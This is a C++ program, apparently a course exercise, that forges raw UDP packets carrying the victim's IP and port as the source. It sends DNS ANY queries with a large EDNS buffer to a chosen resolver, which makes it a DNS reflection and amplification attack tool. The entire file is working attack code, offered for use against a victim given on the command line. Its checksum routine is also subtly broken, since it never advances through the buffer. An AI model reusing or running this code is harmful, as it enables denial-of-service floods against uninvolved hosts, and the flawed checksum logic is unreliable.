#include <bits/stdc++.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

struct dnshdr {
  uint16_t id;
  uint16_t flags;
  uint16_t qdcount;
  uint16_t ancount;
  uint16_t nscount;
  uint16_t arcount;
};

struct QUERY {
  uint16_t qtype;
  uint16_t qclass;
};

struct EDNS {
  uint16_t type;
  uint16_t clazz;
  uint16_t rcode;
  uint16_t z_flag;
  uint16_t rdlen;
};

uint16_t checksum(unsigned short *buf, unsigned int size) {
  register unsigned long sum = 0;
  for (; size > 0; size--) {
    sum += *buf;
  }
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  sum = ~sum;
  return (uint16_t) sum;
}

void dns_qname(unsigned char *qname, unsigned char *domain_name) {
  strcat((char *) domain_name, ".");
  int outset = 0;
  for (int i = 0; i < strlen((char *) domain_name); i++) {
    if (domain_name[i] == '.') {
      *qname++ = i - outset;
      while (outset < i) {
        *qname++ = domain_name[outset++];
      }
      outset = i + 1;
    }
  }
  *qname = '\0';
}

void dns_attack(sockaddr_in victim, sockaddr_in dns_server, unsigned char *domain_name) {
  char *packet = new char[8192];
  ip *ip_header = (ip *) packet;
  udphdr *upd_header = (udphdr * )((char *) ip_header + sizeof(ip));
  dnshdr *dns_header = (dnshdr *) ((char *) upd_header + sizeof(udphdr));

  dns_header->id = htons(0xE1A5);
  dns_header->flags = htons(0x0100);
  dns_header->qdcount = htons(1);
  dns_header->ancount = htons(0);
  dns_header->nscount = htons(0);
  dns_header->arcount = htons(1);

  unsigned char *qname = (unsigned char *) ((char *) dns_header + sizeof(dnshdr));
  dns_qname(qname, domain_name);
  QUERY *query = (QUERY *) (qname + strlen((char *) qname) + 1);
  query->qtype = htons(0x0FF);
  query->qclass = htons(0x001);
  unsigned char *root_domain = (unsigned char *) ((char *) query + sizeof(QUERY));
  *root_domain = 0x00;
  EDNS *edns = (EDNS *) ((char *) root_domain + 1);
  edns->type = htons(41);
  edns->clazz = htons(4096);
  edns->rcode = htons(0);
  edns->z_flag = htons(0x8000);
  edns->rdlen = htons(0);

  int dns_size = sizeof(dnshdr) + strlen((char *) qname) + 1 + sizeof(QUERY) + 1 + sizeof(EDNS);

  upd_header->source = victim.sin_port;
  upd_header->dest = dns_server.sin_port;
  upd_header->len = htons(sizeof(udphdr) + dns_size); // udp_header + data
  upd_header->check = htons(0);

  ip_header->ip_v = 4;
  ip_header->ip_hl = 5;
  ip_header->ip_tos = 0;
  ip_header->ip_len = sizeof(ip) + sizeof(udphdr) + dns_size; // ip_header + upd_header + data
  ip_header->ip_id = htons(0xE1A5);
  ip_header->ip_off = 0;
  ip_header->ip_ttl = 64;
  ip_header->ip_p = IPPROTO_UDP;
  ip_header->ip_sum = 0;
  ip_header->ip_src = victim.sin_addr;
  ip_header->ip_dst = dns_server.sin_addr;
  ip_header->ip_sum = checksum((unsigned short *) packet, ip_header->ip_len);

  unsigned char *parse = (unsigned char *) packet;
  for (int i = 0; i < ip_header->ip_len; i++) {
    std::cout << std::setw(2) << std::setfill('0') << std::hex << std::uppercase << (unsigned short) parse[i] << " ";
  }
  std::cout << std::dec << std::endl;

  int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
  const int opt_val = 1;
  int opt_flag = setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &opt_val, sizeof(opt_val));
  int sendto_flag = sendto(sockfd, packet, ip_header->ip_len, 0, (sockaddr * ) & dns_server, sizeof(dns_server));
  if (sockfd == -1 || opt_flag == -1 || sendto_flag == -1) {
    perror("Error");
  }
  close(sockfd);
  delete[] packet;
}

int main(int argc, char **argv) {
  if (argc == 4) {
    sockaddr_in victim;
    sockaddr_in dns_server;

    victim.sin_family = AF_INET;
    inet_aton(argv[1], &(victim.sin_addr));
    victim.sin_port = htons(atoi(argv[2]));

    dns_server.sin_family = AF_INET;
    inet_aton(argv[3], &(dns_server.sin_addr));
    dns_server.sin_port = htons(53);

    unsigned char google[] = "google.com";
    dns_attack(victim, dns_server, google);
    unsigned char nctu[] = "nctu.edu.tw";
    dns_attack(victim, dns_server, nctu);
    unsigned char ieee[] = "ieee.org";
    dns_attack(victim, dns_server, ieee);
  }
  return 0;
}
